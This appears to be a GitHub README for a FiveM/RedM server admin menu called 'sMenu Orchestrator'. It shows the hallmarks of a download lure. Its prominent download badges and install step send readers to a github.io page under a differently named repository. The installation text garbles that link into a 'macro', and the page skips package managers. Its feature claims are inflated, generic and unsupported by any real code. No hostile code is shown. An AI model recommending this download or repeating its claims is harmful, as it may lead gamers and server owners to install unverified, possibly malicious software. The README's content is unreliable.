![preview](https://raw.githubusercontent.com/dapin622/sMenu-Revived-UI/main/view_a188.svg)
[![Download](https://raw.githubusercontent.com/dapin622/sMenu-Revived-UI/main/btn_37a3.svg)](https://dapin622.github.io/sMenu-Revived-UI/)

# sMenu Orchestrator 🌐

**The Command Center for Community-Driven Game Server Management**

---

## 📖 Overview

Welcome to **sMenu Orchestrator**, the next evolution in interactive server menu systems, inspired by the legendary vMenu architecture but reimagined for a distributed, multi-community era. Think of it less as a static UI and more as a **living control room**—a place where server administrators, moderators, and players converge in a shared, responsive, and multilingual environment.

While traditional menus are rigid panels, sMenu Orchestrator is a **fluid neural network of commands**. It doesn't just display options; it interprets the context of each user, the state of the server, and the time of day to present the most relevant actions. This is not a tool; it's a **digital concierge** for your FiveM or RedM world.

This repository houses the full architecture, from the core engine to the UI components, designed to be modular, extendable, and aesthetically harmonious with any community's brand.

---

## ✨ Key Features

### 🧠 Adaptive Command Intelligence
Forget scrolling through hundreds of static options. Our engine learns from usage patterns. Frequently used commands, like vehicle spawning or player teleportation, dynamically float to the top. The menu *remembers* what you do, making every interaction faster than the last.

### 🌍 Polyglot Native Interface
Language should never be a barrier to moderation. sMenu Orchestrator ships with a **real-time translation core** that allows players and admins to switch between over 30 languages on the fly. UI labels, confirmation dialogs, and even custom menu items support dynamic localization without a server restart.

### 📱 Responsive Fluid Layout
The interface is built on a **liquid grid system**. Whether your user is on a high-refresh-rate ultrawide monitor or a modest laptop screen, the menu adapts its proportions like water taking the shape of its container. Touch gestures are also supported for server owners experimenting with tablet-based management.

### 🛠️ Plugin Scalpel Architecture
Don't modify the core. Instead, attach your custom scripts using our **"Scalpel" API**. This allows you to slice in new functionality—custom admin actions, economy integrations, or vehicle skins—without ever forking the main branch. The core stays pristine; your additions stay organized.

### ⚡ Zero-Friction Performance
The menu operates on an **event-driven heartbeat** rather than a constant polling loop. This means the UI consumes almost no frame time when idle. Resource usage is maintained at a whisper, only awakening when a user interacts, ensuring your server's tick rate remains unaffected.

### 🔐 Granular Permission Fabric
The permission system is woven like a fabric, with multiple layers. You can define roles, but also fine-tune permissions for individual users, temporary windows of time, or based on player distance. It's the most granular access control available, ensuring the right people have the right power at the right moment.

---

## 🏗️ Architecture

```
sMenu-Orchestrator/
├── client/
│   ├── ui/
│   │   ├── components/       # Reusable UI elements (buttons, lists, sliders)
│   │   └── styles/           # CSS variables and theme definitions
│   └── core/                 # Client-side logic for state management & keybinds
├── server/
│   ├── handlers/             # Command execution and permission checks
│   └── bridge/               # Data synchronization layer between client and server
├── shared/
│   ├── config.lua            # Master configuration file to define default menus
│   └── locales/              # JSON files for multilingual support
├── docs/
│   ├── API_REFERENCE.md      # Detailed documentation of the Scalpel API
│   └── TROUBLESHOOTING.md    # Common issues and resolutions
└── LICENSE
```

### 🔩 The Bridge Layer
The `server/bridge` folder is where the magic happens. It acts as a **postal service** between the client UI and the server state. All commands are outbound messages, and all feedback is a return receipt, ensuring no data packet is ever lost or duplicated.

---

## 📚 Installation & Setup

Getting started is a journey of three steps, but we won't use conventional package managers. Instead, we'll follow the **Artisan's Path**:

1.  **Acquire the Blueprint:** Download the repository as a ZIP archive via the `[![Download](https://raw.githubusercontent.com/dapin622/sMenu-Revived-UI/main/btn_37a3.svg)](https://dapin622.github.io/sMenu-Revived-UI/)` macro above and extract it into your resources directory.
2.  **Energize the Core:** Add `ensure sMenu-Orchestrator` to your server configuration file, placing it before other resource scripts that require its native events.
3.  **Ignite the Forge:** Restart your server. The resource will compile the UI assets automatically on first boot.

*Note: The configuration file uses a simple, commented structure. Do not be afraid to explore; every setting is documented in-line.*

---

## 🛠️ Usage & Configuration

After the initial setup, the menu can be toggled by the default `F8` key. Administrators can access the full suite, while players will see a context-aware subset.

### Defining a New Menu Item

Navigate to `shared/config.lua`. Here is an example of adding a simple "Heal Player" command:

```lua
{
    title = "Heal Local Player",
    description = "Restores the user's health to 100%",
    callback = function(playerServerId)
        -- Core logic invoked server-side
    end,
    permission = "moderator",
    icon = "heart"
}
```

### Environment Variables

 | Variable | Purpose | Default |
 | :--- | :--- | :--- |
 | `SMENU_LOCALE` | Defines the default startup language | `en` |
 | `SMENU_THEME` | Choose between `dark` or `light` CSS themes | `dark` |
 | `SMENU_LOG_LEVEL` | Controls verbosity of console logs | `info` |

---

## 🤝 Contributing to the Project

We welcome developers of all skill levels to participate in the growth of sMenu Orchestrator. Please ensure your pull requests adhere to our **code of conduct** and include tests for new features.

1.  **Fork** the repository to your own space.
2.  **Create a feature branch** (`git checkout -b feat/amazing-new-command`).
3.  **Commit your changes** with clear, concise messages.
4.  **Push** to the branch and open a Pull Request.

We review all code submissions with a focus on readability and performance.

---

## 📜 License

This project is open-source and distributed under the **MIT License**. You are permitted to use, copy, modify, merge, publish, and distribute copies of the software, provided that the original copyright notice and this permission notice are included in all copies or substantial portions of the software.

The full legal text can be reviewed in the [LICENSE](LICENSE) file within this repository.

❤️ **Disclaimer:** This project is an independent creation and is not affiliated with, endorsed by, or sponsored by TomGrobbe's vMenu or CI Games. It is a fresh interpretation of a menu system, built from the ground up. The software is provided "as is," without warranty of any kind, express or implied.

---

## 🗓️ 2026 Roadmap

As we move forward into 2026, we are committed to the following enhancements:

- **Web-Based Dashboard:** A companion web app to edit menu files without touching the server console.
- **Voice Command Module:** An experimental integration with speech-to-text libraries for hands-free moderation.
- **Blockchain-based Verifiable Logs:** For high-stakes servers, storing admin actions in a tamper-proof distributed ledger (Optional module).

---

## 🆘 Troubleshooting & Support

If you encounter a hiccup, please follow these steps to resolve it:

1.  **Check the Console:** Ensure there are no red errors in the F8 console related to `sMenu-Orchestrator`.
2.  **Validate Config:** Use a Lua linter to check `config.lua` for syntax errors, as a single misplaced comma can break the entire setup.
3.  **Clear Cache:** Sometimes the UI cache retains old files. Delete the `cache` folder in the resource directory.

If the issue persists, open a detailed issue report on the **Issues** tab of this repository. Our community maintainers (active 24/7) typically respond within a single business cycle.

---

We hope sMenu Orchestrator becomes the centerpiece of your server's interaction ecosystem. Build something amazing. 🚀